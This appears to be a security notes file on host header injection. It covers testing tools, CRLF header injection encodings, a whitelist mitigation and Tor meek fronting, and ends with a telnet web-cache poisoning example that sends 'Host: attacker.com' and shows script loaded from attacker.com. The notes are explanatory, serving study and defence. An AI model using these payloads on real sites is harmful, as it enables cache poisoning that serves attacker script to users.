Captured
-----------

* [PortSwigger’s Burp Suite](https://portswigger.net/burp)
* [AcuMonitor](https://www.acunetix.com/vulnerability-scanner/acumonitor-technology/)
* [Robtex](https://www.robtex.com/en/advisory/dns/net/cloudfront/d3dsacqprgcsqh/#shared_pa_ma)
* Clone any website via wget `wget -mk https://example.com`


False / Positives
----------

* Due header injection (aka host header manipulation) some Content Delivery Networks (CDN's) can be compromised and result in an FP.
* CRLF injection, as with all injected headers, one goal could be to get a response where a very bad host entry (containing `CRLF`, or `%0a%D`, that's `"\r\n"` - even `%1c` or `%1f` works!) would be reused without filtering on the response headers. Leading to headers injection in the response.
* HTTP response splitting / HTTP smuggling needs additional interception (not attackable via Browser).



Migration
----------

#### Server
If you must use the host header as a mechanism for identifying the location of the web server, it’s highly advised to make use of a whitelist of allowed hostnames.


#### Tor
[Meek](https://trac.torproject.org/projects/tor/wiki/doc/AChildsGardenOfPluggableTransports#meek) can be used to send a message to a Tor relay in a way that is almost impossible to block. 

* [Amazon CloudFront](https://trac.torproject.org/projects/tor/wiki/doc/meek#AmazonCloudFront) (meek-amazon)
* [Microsoft Azure](https://trac.torproject.org/projects/tor/wiki/doc/meek#MicrosoftAzure) (meek-azure)



Web-cache poisoning
----------

The below is an example of how an attacker could potentially exploit a host header attack by poisoning a web-cache.


```
$ telnet www.example.com 80
Trying x.x.x.x...
Connected to www.example.com.
Escape character is '^]'.
GET /index.html HTTP/1.1
Host: attacker.com

HTTP/1.1 200 OK
...

<html>
<head>
<title>Example</title>
<script src="http://attacker.com/script.js">
...
```